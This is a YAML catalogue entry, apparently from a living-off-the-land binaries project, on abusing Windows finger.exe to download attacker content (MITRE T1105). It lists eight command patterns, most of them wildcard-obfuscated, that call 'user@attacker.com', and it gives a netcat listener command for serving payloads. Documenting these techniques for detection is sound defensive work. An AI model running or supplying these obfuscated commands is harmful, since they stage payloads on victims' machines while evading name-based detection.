---
Name: finger
Description: "Legacy user info protocol client. Can retrieve arbitrary text from an attacker-controlled finger server, enabling data exfiltration and payload staging."
Platform: windows-cmd
BinaryPath:
  - C:\Windows\System32\finger.exe
Category: download
MitreID: T1105
Patterns:
  - Pattern: "for /f %i in ('where fin*.exe') do %i user@attacker.com"
    Wildcards: ["*"]
    Notes: "Star matches 'ger' after 'fin'"
  - Pattern: "for /f %i in ('where f?nger.exe') do %i user@attacker.com"
    Wildcards: ["?"]
    Notes: "Single char wildcard replaces 'i'"
  - Pattern: "for /f %i in ('where f*r.exe') do %i user@attacker.com"
    Wildcards: ["*"]
    Notes: "Star matches 'inge' between 'f' and 'r'"
  - Pattern: "for /f %i in ('dir /b C:\\Windows\\System32\\fin*.exe') do %i user@attacker.com"
    Wildcards: ["*"]
    Notes: "dir /b glob finds finger.exe in System32"
  - Pattern: "forfiles /p C:\\Windows\\System32 /m fin*.exe /c \"@file user@attacker.com\""
    Wildcards: ["*"]
    Notes: "forfiles * mask finds finger.exe — @file expands to matched filename"
  - Pattern: "C:\\Windows\\System32\\finger.exe user@attacker.com"
    Wildcards: []
    Notes: "Direct invocation — response from attacker's finger server is printed to stdout"
  - Pattern: "for %i in (C:\\Windows\\System32\\fin*.exe) do @%i user@attacker.com"
    Wildcards: ["*"]
    Notes: "Native CMD for loop with filesystem glob — expands fin*.exe directly in System32 without where.exe"
    Method: "Simple for glob"
  - Pattern: "for /f %i in ('where /r C:\\Windows\\System32 fin*.exe') do %i user@attacker.com"
    Wildcards: ["*"]
    Notes: "Recursive where search — fin* matches finger.exe; scoped to System32 to avoid matching other tools"
    Method: "where /r recursive"
PlatformNotes: |
  finger.exe is enabled on older/misconfigured Windows systems. It queries the RFC 1288 finger protocol (TCP/79). An attacker can run a netcat listener (`nc -l -p 79`) to serve arbitrary data. The response is printed to stdout and can be captured with `for /f`. In batch scripts use `%%i` instead of `%i`.
Resources:
  - https://attack.mitre.org/techniques/T1105/
  - https://lolbas-project.github.io/lolbas/Binaries/Finger/
---
